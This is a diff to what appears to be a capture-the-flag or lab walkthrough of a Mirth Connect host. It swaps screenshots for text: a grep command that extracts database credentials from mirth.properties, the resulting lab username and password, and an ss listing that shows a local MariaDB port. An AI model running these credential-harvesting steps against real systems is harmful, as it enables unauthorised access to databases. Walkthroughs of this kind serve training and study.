@@ -66,11 +66,40 @@ stty raw -echo; fg
 
 At this point we want to identify any related files of interest for the underlying Mirth Connect technology. After some research we discover the following file which contains database credentials:
 
-<img src="Images/08-Database-Crds.png" width="600">
+### Extract creds with grep:
 
-Using ss, we discover that there is a running SQL server on port 3306:
+```
+grep -i  'url\|user\|pass' /usr/local/mirthconnect/conf/mirth.properties
+```
 
-<img src="Images/09-Netstat.png" width="600">
+### Output:
+
+```
+database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
+database.username = mirthdb
+database.password = MirthPass123!
+```
+
+Using SS, we discover that there is a running SQL server on port 3306:
+
+### Execute SS:
+
+```
+ss -ltnp
+```
+
+### Output:
+
+```
+State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                          
+LISTEN 0      50           0.0.0.0:80         0.0.0.0:*    users:(("java",pid=3524,fd=327))
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                    
+LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                    
+LISTEN 0      50           0.0.0.0:443        0.0.0.0:*    users:(("java",pid=3524,fd=331))
+LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*                                    
+LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*    users:(("java",pid=3524,fd=335))
+LISTEN 0      128             [::]:22            [::]:* 
+```
 
 With this information, we connect to the SQL server using MariaDB:
 
